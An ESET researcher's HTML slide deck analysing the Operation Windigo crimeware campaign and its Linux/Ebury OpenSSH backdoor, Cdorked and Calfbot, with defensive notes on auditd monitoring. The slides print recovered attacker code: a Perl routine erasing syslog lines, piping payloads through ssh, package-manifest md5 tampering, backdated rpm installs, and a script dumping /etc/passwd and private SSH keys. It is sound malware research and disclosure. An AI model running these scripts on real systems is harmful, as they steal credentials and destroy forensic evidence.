<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta name="author" content="Marc-Etienne M.Léveillé" /><title>Are attackers using automation more efficiently than defenders?</title><meta content="yes" name="apple-mobile-web-app-capable" /><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style" /><meta content="width=(device-width, initial-scale=1.0, maximum-scale=1.0,)user-scalable=no" name="viewport" /><link href="reveal.js/css/reveal.min.css" rel="stylesheet" /><link rel="stylesheet" href="reveal.js/css/theme/eset.css" id="theme" /><link href="reveal.js/lib/css/zenburn.css" rel="stylesheet" /><script type="text/javascript">document.write( '<link rel="stylesheet" href="reveal.js/css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );</script></head><body><div class="reveal"><div class="slides"><section id="_are_attackers_using_automation_more_efficiently_than_defenders"><h2>Are attackers using automation more efficiently than defenders?</h2><h3>Marc-Etienne M.Léveillé, ESET (<a href="http://twitter.com/marc_etienne_">@marc_etienne_</a>)</h3></section>
<section id="__whoami"><h2>:~$ whoami</h2><h3>Marc-Etienne M.Léveillé</h3><div class="ulist"><ul><li><p>Malware Researcher at ESET</p></li><li><p>Interested in OS X and Linux threats</p></li><li><p>InfoSec CTF competition fan (former CSAW CTF Finalists)</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>worked on reverse engineering the Cdorked and Ebury components of O.W. and
gathering data from victims' servers and millions of whois requests</p></div></aside></section>
<section id="__whoami_2"><h2>:~$ whoami</h2><div class="paragraph"><p><span class="image"><img src="images/logo_cissp.svg" alt="logo_cissp" width="40%" /></span> <span class="image"><img src="images/gin-and-tonic.jpg" alt="gin-and-tonic" /></span></p></div></section>
<section id="__apropos"><h2>:~$ apropos</h2><div class="ulist"><ul><li><p>What is Operation Windigo?</p></li><li><p>Automating a dark cloud</p></li><li><p>Defeating Ebury</p></li><li><p>Automating defense</p></li></ul></div></section>
<section id="__w_grep_v_marc_etienne"><h2>:~$ w | grep -v marc-etienne</h2><h3>aka Who are you?</h3><aside class="notes"><div class="ulist"><ul><li><p>everyone up.</p></li><li><p>sit down if you never touched a linux system (android excluded)</p></li><li><p>sit down if you never used SSH</p></li><li><p>sit down if you never seen Linux malware</p></li><li><p>sit down if you never seen Linux malware in ELF binaries as opposed to PHP or
perl scripts</p></li></ul></div>
<div class="paragraph"><p>Alright, enough with the silly commands&#8230;&#8203;
Linux (server) Malware is getting</p></div></aside></section>
<section id="_what_is_operation_windigo"><h2>What is Operation Windigo?</h2><div class="paragraph"><p>Crimeware operation consisting of several malware components&#8201;&#8212;&#8201;Linux/Ebury,
Linux/Cdorked and Perl/Calfbot&#8201;&#8212;&#8201;where the <strong>infrastructure is mostly operated
on compromised servers</strong>.</p></div>
<div class="paragraph"><p>Used for <strong>traffic redirection</strong> and sending <strong>spam</strong>.</p></div>
<aside class="notes"><div class="ulist"><ul><li><p>a set of malware</p></li><li><p>use compromised server for infrastructure</p></li></ul></div></aside></section>
<section id="_what_is_operation_windigo_2"><h2>What is Operation Windigo?</h2><div class="paragraph"><p><span class="image"><img src="images/windigo_cover.png" alt="windigo_cover" width="40%" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>Windigo is a mythic creature from Algonquian, a native american tribe from North america.</p></li></ul></div></aside></section>
<section id="_operation_windigo"><h2>Operation Windigo</h2><h3>A joint investigation effort</h3><div class="paragraph"><p><span class="image"><img src="images/cert-bund.png" alt="cert-bund" /></span> <span class="image"><img src="images/cern.png" alt="cern" /></span> <span class="image"><img src="images/eset.png" alt="eset" /></span> <span class="image"><img src="images/snic.png" alt="snic" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>The Ebury Working Group</p></li><li><p>CERT-Bund, right here, Germany</p></li><li><p>CERN, hedron collider, you know these guys, [mostly Genève]</p></li><li><p>SNIC: Swedish National Infrastructure for Computing</p></li><li><p>and law enforcement</p></li></ul></div></aside></section>
<section id="_big_picture"><h2>Big Picture</h2><div class="paragraph"><p><span class="image"><img src="images/windigo_big_picture.png" alt="windigo_big_picture" width="87%" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>I know its small</p></li><li><p>operators at the bottom, victims on top</p></li><li><p>layers of compromised servers separates them</p></li><li><p>proxy servers, DNAT, DNS servers, Web servers, C&amp;C all run on Ebury infected
machines</p></li></ul></div></aside></section>
<section id="_how_does_it_expand"><h2>How does it expand?</h2><div class="paragraph"><p><span class="image"><img src="images/infection_scenario.png" alt="infection_scenario" width="88%" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>See, it&#8217;s all about stolen credentials</p></li><li><p>SSH gateways are especially bad</p></li><li><p>mention cPanel support server compromise</p></li><li><p>Stop using passwords, consider Two-Factor Auth</p></li></ul></div></aside></section>
<section id="_end_goal"><h2>End goal ($)</h2><div class="ulist"><ul><li><p>Install malware on Windows end-users</p><div class="ulist"><ul><li><p>Exploit Kits: Flashpack, Blackhole, RIG</p></li><li><p>Win32/Glupteba (more spam capability)</p></li></ul></div></li><li><p>Spam</p><div class="ulist"><ul><li><p>Mostly adult affiliate programs links</p></li><li><p>Some Casino</p></li></ul></div></li><li><p>Web-site redirections to adult affiliate programs</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>before was Win32/Boaxxe (click fraud) dep on country</p></div></aside></section>
<section id="_impact"><h2>Impact</h2><div class="ulist"><ul><li><p><strong>25 000+</strong> compromised servers</p></li><li><p><strong>500 000</strong> browser redirections per day (20% go to exploit packs)</p></li><li><p><strong>35M+</strong> spam sent per day</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>80% redirection to affiliate</p></li><li><p>There is an ongoing law enforcement investigation</p></li><li><p>Spam is calfbot only</p></li></ul></div></aside></section>
<section id="_local_impact"><h2>Local Impact</h2><div class="listingblock oversize1"><div class="content"><pre class="highlight"><code>$ cat ebury_victim_list_iponly.txt
[...]
128.238.xx.xx
128.238.xxx.xx
[...]</code></pre></div></div></section>
<section id="_local_impact_2"><h2>Local Impact</h2><div class="listingblock oversize1"><div class="content"><pre class="highlight"><code>$ cat ebury_victim_list.txt
[...]
128.238.xx.xx   US      POLYTECHNIC UNIVERSITY  xxxxxx.poly.edu
128.238.xxx.xx  US      POLYTECHNIC UNIVERSITY  xxxx.isis.poly.edu
[...]</code></pre></div></div></section>
<section id="_linux_ebury"><h2>Linux/Ebury</h2><div class="ulist"><ul><li><p>OpenSSH backdoor</p><div class="ulist"><ul><li><p>Replacing original OpenSSH binaries (ssh, sshd, ssh-add)</p></li><li><p>Then: replaces a shared library and hooks OpenSSH&#8217;s address space</p></li></ul></div></li><li><p>Provides a backdoor root shell to the operators</p><div class="ulist"><ul><li><p>Doesn’t leave traces behind when used</p></li></ul></div></li><li><p>Steals SSH passwords and keys</p><div class="ulist"><ul><li><p>When connecting <strong>to</strong> and <strong>from</strong> the infected machine</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Named Ebury by Steinar H. Gunderson in Nov 2011</p></li><li><p>Core of the Windigo Operation</p></li><li><p>Then in 2013, libkeyutils.so</p></li></ul></div></aside></section>
<section id="_how_the_shared_library_works"><h2>How the shared library works</h2><div class="olist arabic"><ol class="arabic"><li><p>Shared library has a <strong>constructor function</strong> executed when loaded</p></li><li><p>Detect main executable that is loading <code>libkeyutils.so</code></p></li><li><p>Hook imported function such as <code>crypt</code> and <code>syslog</code></p></li><li><p>Detect main executable address space (<code>dlopen(NULL)</code>)</p></li><li><p>Patch code inside main executable to redirect function calls to the malicious <code>libkeyutils.so</code></p></li></ol></div></section>
<section id="_hook_imported_function"><h2>Hook imported function</h2><div class="paragraph"><p><span class="image"><img src="images/ebury_code_hook.png" alt="ebury_code_hook" /></span></p></div></section>
<section id="_key_parse_clean"><h2>key_parse clean</h2><div class="paragraph"><p><span class="image"><img src="images/ssh_key_parse_clean.png" alt="ssh_key_parse_clean" /></span></p></div></section>
<section id="_key_parse_hooked"><h2>key_parse hooked</h2><div class="paragraph"><p><span class="image"><img src="images/ssh_key_parse_hooked.png" alt="ssh_key_parse_hooked" /></span></p></div></section>
<section id="_how_information_is_exfiltrated"><h2>How information is exfiltrated?</h2><div class="olist arabic"><ol class="arabic"><li><p>Passwords are sent inside a DNS packet with all required information such as username, target IP address and port</p></li><li><p>Keys are kept in memory and are later fetched by the operators with the <code>Xcat</code> command</p></li></ol></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>98.174.121.19 -&gt; 75.82.52.14  DNS Standard query 0x4cdd  A b74bebe10cad6ffe684bf8a1.62.220.51.41</code></pre></div></div></section>
<section id="_backdoor_interaction"><h2>Backdoor interaction</h2><div class="paragraph"><p>To trigger the Linux/Ebury remotely in sshd, a special SSH client version identifier is used</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>192.27.81.11 -&gt; 78.240.11.44 SSH Server: Protocol (SSH-2.0-OpenSSH_5.3)
78.240.11.44 -&gt; 192.27.81.11 SSH Client: Protocol (SSH-2.0-0861d60b2465c0383076d8233273da)

[11 bytes password][optional 4 bytes command][optional 4 bytes argument]</code></pre></div></div></section>
<section id="_backdoor_interaction_cont"><h2>Backdoor interaction (cont.)</h2><div class="paragraph"><p>5 commands</p></div>
<div class="ulist"><ul><li><p>Xver: print Linux/Ebury version installed</p></li><li><p>Xcat: print stolen credentials</p></li><li><p>Xbnd: choose binded IP address for SSH tunnel</p></li><li><p>Xpsw: set additional 4 byte xor key for future backdoor usage</p></li><li><p>None: get a shell</p></li></ul></div></section>
<section id="_ebury_infection_map"><h2>Ebury infection map</h2><div class="paragraph"><p><span class="image"><img src="images/ebury_all_victims.svg" alt="Geographic Distribution of Linux/Ebury Infections" width="800" /></span></p></div></section>
<section id="_ebury_infection_top_5"><h2>Ebury infection (top 5)</h2><table class="tableblock frame-all grid-all" style="width:100%"><colgroup><col style="width:33%" /><col style="width:33%" /><col style="width:33%" /></colgroup><thead><tr><th class="tableblock halign-left valign-top">Position</th><th class="tableblock halign-left valign-top">Country</th><th class="tableblock halign-left valign-top">Count</th></tr></thead><tbody><tr><td class="tableblock halign-left valign-top"><p class="tableblock">1</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">United States</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">10,065</p></td></tr><tr><td class="tableblock halign-left valign-top"><p class="tableblock">2</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">Germany</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">2,489</p></td></tr><tr><td class="tableblock halign-left valign-top"><p class="tableblock">3</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">France</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">1,431</p></td></tr><tr><td class="tableblock halign-left valign-top"><p class="tableblock">4</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">Italy</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">1,169</p></td></tr><tr><td class="tableblock halign-left valign-top"><p class="tableblock">5</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">United Kingdom</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">993</p></td></tr><tr><td class="tableblock halign-left valign-top"></td><td class="tableblock halign-left valign-top"><p class="tableblock">Others</p></td><td class="tableblock halign-left valign-top"><p class="tableblock">9,877</p></td></tr><tr><td class="tableblock halign-left valign-top"><p class="tableblock">Total</p></td><td class="tableblock halign-left valign-top"></td><td class="tableblock halign-left valign-top"><p class="tableblock">26,024</p></td></tr></tbody></table></section>
<section id="_who_ssh_with_root"><h2>Who ssh with root?</h2><div class="paragraph"><p><span class="image"><img src="images/leaked_password_root_vs_nonroot.png" alt="leaked_password_root_vs_nonroot" width="80%" /></span></p></div>
<aside class="notes"><div class="paragraph"><p>Did you think as many people use root to log in there server?</p></div></aside></section>
<section id="_linux_cdorked"><h2>Linux/Cdorked</h2><div class="ulist"><ul><li><p>httpd/nginx/lighttpd backdoor</p><div class="ulist"><ul><li><p>Replacing binary on the server</p></li></ul></div></li><li><p>Redirect HTTP request on legitimate web site the exploit packs or affiliate links</p></li><li><p>Use shared memory (POSIX IPC) for state and configuration</p><div class="ulist"><ul><li><p>No file on disk</p></li><li><p>It&#8217;s encrypted with a static XOR key unique per infection</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Installed on a small subset of Ebury infected server</p></li><li><p>Replace binary on server</p></li><li><p>Lots of effort put into making the patch cross-server</p></li><li><p>A lot of porn website compromised</p></li></ul></div></aside></section>
<section id="_linux_cdorked_stealth"><h2>Linux/Cdorked Stealth</h2><div class="paragraph"><p><span class="image"><img src="images/cdorked_redirect_conditions.png" alt="cdorked_redirect_conditions" width="35%" /></span></p></div></section>
<section id="_linux_cdorked_stealth_cont"><h2>Linux/Cdorked Stealth (cont.)</h2><div class="ulist"><ul><li><p>Presence and content of Accept, Accept-Language, Referer, User-Agent headers</p></li><li><p>Presence of administrative panel references in URL</p><div class="ulist"><ul><li><p>*cpanel*</p></li><li><p>*secur*</p></li><li><p>*bill*</p></li><li><p>etc</p></li></ul></div></li><li><p>It is a web page? (.html, .php, etc)</p></li><li><p>Did I redirect this client IP address in the last 24 hours?</p></li></ul></div></section>
<section id="_cdorked_ratio"><h2>Cdorked ratio</h2><div class="paragraph"><p>Only a small percentage of Ebury infected hosts have Cdorked installed.</p></div>
<aside class="notes"><div class="ulist"><ul><li><p>By the time we wrote the paper</p></li><li><p>A lot of porn site</p></li></ul></div></aside></section>
<section id="_linking_cdorked_and_ebury"><h2>Linking Cdorked and Ebury</h2><div class="paragraph"><p><span class="image"><img src="images/cdorked_crypto.png" alt="cdorked_crypto" /></span> <span class="image"><img src="images/ebury_crypto.png" alt="ebury_crypto" /></span></p></div>
<div class="paragraph"><p>Cdorked | Ebury</p></div>
<aside class="notes"><div class="paragraph"><p>Reverse order, we got Cdorked before Ebury</p></div></aside></section>
<section id="_perl_calfbot"><h2>Perl/Calfbot</h2><div class="ulist"><ul><li><p>Perl spamming daemon</p></li><li><p>Deletes itself when running, resides only in memory</p></li><li><p>Hides as <code>crond</code></p></li></ul></div></section>
<section id="_posix_calfbot"><h2>POSIX/Calfbot</h2><div class="paragraph"><p><span class="image"><img src="images/os_distribution.png" alt="os_distribution" width="80%" /></span></p></div>
<aside class="notes"><div class="ulist"><ul><li><p>obtained via eavesdropping of the C&amp;C SSL traffic</p></li></ul></div></aside></section>
<section id="_windigo_group_noteworthy_compromises"><h2>Windigo group noteworthy compromises</h2><div class="ulist step"><ul><li class="fragment"><p>kernel.org infected at some point in 2011</p></li><li class="fragment"><p>cPanel support SSH gateway</p></li><li class="fragment"><p>poly.edu ;)</p></li></ul></div></section>
<section id="_why_advanced" data-background="#797620"><h2>Why advanced?</h2><div class="ulist"><ul><li><p>Stealth</p><div class="ulist"><ul><li><p>close to no disk persistence</p></li><li><p>uses shared memory</p></li><li><p>hooks into binaries</p></li><li><p>do not affect existing services</p></li></ul></div></li><li><p>Effective</p><div class="ulist"><ul><li><p>large number of compromised servers</p></li><li><p>validates spamming</p></li><li><p>maximizes available server resources</p></li></ul></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>libkeyutils, is a real system library so this is nasty</p></li><li><p>looking for hashes of daemons not enough (libkeyutils, a real library)</p></li></ul></div></aside></section>
<section id="_automating_a_dark_cloud"><h2>Automating a dark cloud</h2><aside class="notes"><div class="ulist"><ul><li><p>Using compromised server is a because you have to deal with a lot of OS</p></li></ul></div></aside></section>
<section id="_devops_malware_operators"><h2>DevOps malware operators?</h2><div class="ulist"><ul><li><p>Found very interesting monitoring and deployments scripts</p></li><li><p>Interesting usage (SSH stream redirections):</p><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash">cat payload.pl | ssh victim perl
# or
cat payload.sh | ssh victim bash</code></pre></div></div></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>Leaves little traces since</p><div class="ulist"><ul><li><p>stdin is from operator</p></li><li><p>stdout/stderr goes to him</p></li></ul></div></li><li><p>Without clever monitoring, nothing (log) will stay on disk</p></li><li><p>Explains why we saw nothing in auditd</p></li></ul></div></aside></section>
<section id="_recon_deployment_scripts"><h2>Recon / Deployment scripts</h2><div class="ulist"><ul><li><p>Written in Perl</p></li><li><p>Always reports to <code>STDOUT</code></p><div class="ulist"><ul><li><p>Errors</p></li><li><p>Status</p></li></ul></div></li></ul></div></section>
<section id="_perl_scripts"><h2>Perl scripts</h2><div class="ulist"><ul><li><p>Not obfuscated</p></li><li><p>But as readable as Perl can be</p></li></ul></div>
<div class="paragraph"><p><span class="image"><img src="images/perl.jpg" alt="perl" width="120%" /></span></p></div></section>
<section id="_eliminates_evidence"><h2>Eliminates evidence</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>`mkdir -p /home/tmpq`; $tfile = '/home/tmpq/q3def';
@blist=`find  /var/log -type f -mtime -1 -size +100M -ls`; print @blist if @blist;
@logs=`cat /etc/syslog.conf|grep -vi \"#\"|grep -vi dev`;
foreach (@logs) {$logs{$1}++ if m|.*?(/.+)| and not m|/mail| }
foreach $file (keys %logs) {
    next if checktime($file); # print "Check $file\n";
    $system="cat $file|egrep -i \"$n_date\"|egrep -i \"$string\""; #print "$system\n";
    $test=`$system`; print "Found in $file. Try to correct\n" if $test; next unless $test;
    $system="cat $file|egrep -vi \"$n_date\"&gt;$tfile;cat $file|egrep \"$n_date\"|egrep -vi \"$string\"\&gt;&gt;$tfile;cat $tfile&gt;$file;rm -f $tfile";
#    print "$system\n"; #!
    system($system) }</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>Parses syslog.conf to eliminate ANY logline that has:</p><div class="ulist"><ul><li><p>username</p></li><li><p>'Failed password'</p></li><li><p>IP</p></li></ul></div></li><li><p>Avoids large files &gt;100Mb</p></li><li><p>Moves on to any file in /var/log/ except a blacklist</p></li></ul></div></aside></section>
<section id="_recon_scripts"><h2>Recon scripts</h2><div class="ulist"><ul><li><p>Checks for LD_PRELOAD trickery</p></li><li><p>Various restrictive <code>ssh</code> configurations</p></li><li><p>BSD jails</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code class="perl language-perl">if (-l '/bin') {
    print "\n\tlALERT!!! /bin is link, seems like bsd jail\n";
    $alert++
}</code></pre></div></div>
<div class="ulist"><ul><li><p>CPanel, BRadmin, Nagios ipcs plugin, auditd</p></li></ul></div></section>
<section id="_recon_cont"><h2>Recon (cont)</h2><div class="ulist"><ul><li><p>Generic <code>ssh</code> honeypots</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>@sd = `strings /usr/sbin/sshd |grep -e "^/usr/local/libexec"`;
chomp @sd;
if (@sd) { print "\n\tALERT!!! , ".join("|",@sd)."\n" }
my $ppid=getppid;
my $pb=readlink("/proc/$ppid/exe");
if ($pb ne '/usr/sbin/sshd') {
    print "\n\tlALERT!!! parent:$pb, $ppid\n";
    $alert++
}</code></pre></div></div></section>
<section id="_recon_cont_2"><h2>Recon (cont)</h2><div class="ulist"><ul><li><p>Detects available tools (pkg mgmt, gcc, patch, &#8230;&#8203;)</p></li><li><p>Check for header files to compile OpenSSH</p></li><li><p>Check if Ebury is already installed</p></li></ul></div></section>
<section id="_recon_cont_3"><h2>Recon (cont)</h2><div class="paragraph"><p>Output</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>[...]
_#_#_ sysinfo:
_#_#_ uname:Linux 3.2.0-4-amd64 #1 SMP Debian 3.2.46-1 x86_64 GNU/Linux
_#_#_ dname:/etc/debian_version :7.1
_#_#_ issue:Debian GNU/Linux 7 \n \l_
_#_#_ ssh:OpenSSH_6.0p1 Debian-4, OpenSSL 1.0.1e 11 Feb 2013
_#_#_ pkg:/usr/bin/apt-get
_#_#_ gcc:
_#_#_ patch:
_#_#_ bash:/bin/bash
[...]
DEB check: ok
_#_#_ ifconfig:
          inet addr:xxx.xx.x.xx
          inet addr:127.0.0.1  Mask:255.0.0.0
_#_#_ ifconfig_end
alert:'1'; exit</code></pre></div></div></section>
<section id="_deployment_script"><h2>Deployment script</h2><div class="ulist"><ul><li><p>Uses Perl&#8217;s <em>DATA</em> to pass files through <code>ssh</code></p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>open(TAR,"| tar zxf - $ln $sl");
binmode(DATA);
while(&lt;DATA&gt;) {
    print TAR $_;
}
close TAR;

__DATA__
^_&lt;8b&gt;^H^@VÃÇS^@^Cí½    X^TÇÖ0Ü3Ì("0hÀ¨^Q^]^U#î&lt;8e&gt;&lt;82&gt;+( è h^@^E&lt;
8c&gt;¸¯&lt;88&gt;^K^Fg^T^W^PÒ`hÚ6ÞKÌÍ¢Ù4Ñ71jbôÆ^]\@&lt;8c&gt;^Z%Æ%j$Æhã&lt;98&gt;&lt;88&gt;&lt;
9a&gt;¸kÿç&lt;9c&gt;ê&lt;86&gt;&lt;81&gt;ÈûÝÿû&lt;9e&gt;÷{&lt;9e&gt;ÿùimªêÔ©Sû©sªjúÌ&lt;9e&gt;9yñâ^^&lt;96&gt;i
&lt;93&gt;¹ÿ¹§;&lt;½^B^BÈ&lt;85&gt;§&lt;86&gt;Û»gïÀî&lt;9c&gt;¥GÏ^&lt;96&gt;Þ^AÝ^CÁßÝbéÙ£^Ggîþ?X¦ÊÇ
&gt;ß6)ÕlæRSRlÿ^]Þÿ*þÿ£Ï²&lt;88&gt;¨Áz&lt;9d&gt;®2ìÂ^Mà0Ô½1^K&lt;87&gt;¨pÿ×ªÒ&lt;84&gt;p}¸zð÷</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>VIM output</p></li><li><p>Special literal that allows to embed binary data in a Perl script</p></li><li><p>avoids having them to fetch additional stuff (less visible)</p></li><li><p>the DATA is real binary, not the vim shit I pasted here</p></li></ul></div></aside></section>
<section id="_deployment_script_cont"><h2>Deployment script (cont)</h2><div class="paragraph"><p>Altering package management manifests</p></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>sub fix_md5 {
    my @df = glob("/var/lib/dpkg/info/libkeyutils1*.md5sums");
    get_md5();
    open( $fh, "&lt;$df" );
    my @q = &lt;$fh&gt;;
    close $fh;
    for (@q) {
        $c++ if s|\S+  $d1/$rfile\n|$md5  $d1/$rfile\n|
    }

    open( $fh, "&gt;$df" );
    print $fh @q;
    close $fh;
    print "md5fix: fixed lines: $c\n";
}</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>this is the debian version</p></li><li><p>I cleaned it up a bit so it&#8217;ll fit the screen</p></li></ul></div></aside></section>
<section id="_deployment_script_cont_2"><h2>Deployment script (cont)</h2><h3>How do you install an rpm in the past?</h3><div class="listingblock"><div class="content"><pre class="highlight"><code class="perl language-perl">$install_time = `rpm -q --qf '%{INSTALLTIME}\n' keyutils-libs`
`MYRPMT="$install_time" LD_PRELOAD=./override_time.so
rpm --replacepkgs --replacefiles --noscripts --nosignature -U malicious_libkeyutils_package.rpm`</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>This is a de-obfuscated version</p></li><li><p>The original install date is kept in a variable pushed in the environment.
override_time.so replaces time implementation to return MYRPMT when it will
be called by rpm</p></li></ul></div></aside></section>
<section id="_deployment_script_cont_3"><h2>Deployment script (cont)</h2><div class="listingblock"><div class="content"><pre class="highlight"><code class="bash language-bash"># rpm --verify keyutils-libs
(no error)
# rpm -qi keyutils-libs
Name        : keyutils-libs                Relocations: (not relocatable)
Version     : 1.4                               Vendor: CentOS
Release     : 4.el6                         Build Date: Fri 22 Jun 2012 02:20:38 AM EDT
Install Date: Mon 27 Jan 2014 06:08:43 AM EST      Build Host: c6b10.bsys.dev.centos.org
Group       : System Environment/Base       Source RPM: keyutils-1.4-4.el6.src.rpm
Size        : 59320                            License: GPLv2+ and LGPLv2+
Signature   : RSA/SHA1, Sun 24 Jun 2012 06:18:51 PM EDT, Key ID 21efc4bf71fbfe7b
URL         : http://people.redhat.com/~dhowells/keyutils/
Summary     : Key utilities library
Description :
This package provides a wrapper library for the key management facility system
calls.</code></pre></div></div></section>
<section id="_daily_monitoring_script"><h2>Daily monitoring script</h2><div class="ulist"><ul><li><p>Bash</p></li><li><p>Grabs keys, known hosts, user ssh configs</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>echo __% Passwd
cat /etc/passwd
# [...]
ud=`awk -F':' '{print $6}' &lt;/etc/passwd|sort -u`;
echo __% KHosts
for f in $ud;do cat $f/.ssh/known_hosts 2&gt;/dev/null;done
echo __% SSHConf
for f in $ud;do cat $f/.ssh/config 2&gt;/dev/null &amp;&amp; echo _%__${f};done
echo __% SSHKeys_priv
for f in $ud;do
[ -e $f/.ssh/id_rsa ] &amp;&amp; { echo _%__$f/.ssh/id_rsa;cat $f/.ssh/id_rsa;echo; }
[ -e $f/.ssh/id_dsa ] &amp;&amp; { echo _%__$f/.ssh/id_dsa;cat $f/.ssh/id_dsa;echo; } done</code></pre></div></div></section>
<section id="_other_scripts_findings"><h2>Other scripts findings</h2><div class="ulist"><ul><li><p>Modifies SELinux policy</p></li><li><p>Various styles of installation</p><div class="ulist"><ul><li><p>precompiled libraries</p></li><li><p>on-site compilation</p></li><li><p>packages</p></li></ul></div></li><li><p>Looks for over 40 backdoors/rootkits</p></li></ul></div>
<aside class="notes"><div class="paragraph"><p>some are not even publicly documented</p></div></aside></section>
<section id="_devops_malware_operators_2" data-background="#797620"><h2>DevOps malware operators</h2><div class="ulist"><ul><li><p>Manage <em>their</em> infrastructure with code</p></li><li><p>Pass data in-band with <code>ssh</code></p></li><li><p>Eliminate logs, restore timestamps</p></li><li><p>Get rid of security features</p></li></ul></div>
<aside class="notes"><div class="ulist"><ul><li><p>devops-style but with bad Perl code ;)</p></li><li><p>ssh means encrypted, which is impossible to decrypt</p></li><li><p>extensive pipe and filter tricks, with LD_PRELOAD trickery</p></li><li><p>packaging manifests, other malware, SELinux, &#8230;&#8203;</p></li></ul></div></aside></section>
<section id="_defeating_ebury"><h2>Defeating Ebury</h2><aside class="notes"><div class="ulist"><ul><li><p>go over what we have done to collect this information</p></li></ul></div></aside></section>
<section id="_same_privileges"><h2>Same privileges</h2><div class="paragraph"><p>How to spy on a malicious user with the same privileges?</p></div>
<div class="ulist step"><ul><li class="fragment"><p>syslog: omits logging</p></li><li class="fragment"><p>package manifests: tampered</p></li><li class="fragment"><p>tcpdump: Ebury stops on <code>IFF_PROMISC</code>, ssh traffic is encrypted</p></li><li class="fragment"><p>core dumping processes and shared memory: long</p></li><li class="fragment"><p>auditd!</p></li></ul></div></section>
<section id="_auditd"><h2>auditd</h2><div class="paragraph"><p><em>The Linux audit framework provides an auditing system that reliably collects
information about any security-relevant (or non-security-relevant) event on a
system.</em></p></div>
<div class="ulist"><ul><li><p>logging syscalls</p></li><li><p>logs can be sent over the network</p></li></ul></div>
<div class="listingblock"><div class="content"><pre class="highlight"><code>auditctl -a exit,always -S execve</code></pre></div></div>
<aside class="notes"><div class="ulist"><ul><li><p>gather intelligence without tipping off: <code>execve</code> calls</p></li><li><p>remote logs: Making tampering a lot harder</p></li><li><p>now their recon script checks if auditd is activated</p></li><li><p>very verbose</p></li></ul></div></aside></section>
<section id="_auditd_logs"><h2>auditd logs</h2><div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373838239.340:4474200): argc=4 a0="rm" a1="-f" a2="-f" a3="/tmp/q"
type=CWD msg=audit(1373838239.340:4474200):  cwd="/home/tmpp/openssh-5.9p1"
type=PATH msg=audit(1373838239.340:4474200): item=0 name="/bin/rm"
\- inode=22282288 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00
type=PATH msg=audit(1373838239.340:4474200): item=1 name=(null) inode=4456796
\- dev=08:01 mode=0100755 ouid=0 ogid=0 rdev =00:00
type=SYSCALL msg=audit(1373838239.341:4474201): arch=c000003e syscall=59
\- success=yes exit=0 a0=1f29d40 a1=1eec5f0 a2=1f 03ec0 a3=7fffd6be9a60
\- items=2 ppid=13403 pid=21287 auid=501 uid=0 gid=0 euid=0
\- suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty =pts0 ses=128232 comm="touch" exe="/bin/touch" key=(null)
type=EXECVE msg=audit(1373838239.341:4474201): argc=4 a0="touch" a1="-r"
\- a2="/etc/ssh/sshd_config" a3="/etc/ssh/ssh_config"</code></pre></div></div></section>
<section id="_auditd_logs_cont"><h2>auditd logs (cont.)</h2><h3>On non-ascii arguments it switches to hex</h3><div class="listingblock"><div class="content"><pre class="highlight"><code>type=EXECVE msg=audit(1373837952.278:4473290): argc=26 a0="gcc" a1="-g"
a2="-O2" a3="-Wall" a4="-Wpointer-arith" a5="-Wuninitialized"
a6="-Wsign-compare" a7="-Wformat-security" a8="-Wno-pointer-sign"
a9="-Wno-unused-result" a10="-fno-strict-aliasing" a11="-fno-builtin-memset"
a12="-fstack-protector-all" a13="-I." a14="-I."
a15=2D445353484449523D222F6574632F73736822 a16=2D445F504154485F5353485F50
524F4752414D3D222F7573722F6C6F63616C2F62696E2F73736822
[...]
a21=2D445F504154485F5353485F5049444449523D222F7661722F72756E22
a22=2D445F504154485F505249565345505F4348524F4F545F4449523D222F7661722F656D70747922
a23="-DHAVE_CONFIG_H" a24="-c" a25="rsa.c"

$ ipython
in [1]: ('2D445F504154485F5353485F504B435331315F48454C504552'
        '3D222F7573722F6C6F63616C2F6C6962657865632F7373682D'
        '706B637331312D68656C70657222').decode('hex')
Out[2]: '-D_PATH_SSH_PKCS11_HELPER="/usr/local/libexec/ssh-pkcs11-helper"'</code></pre></div></div>
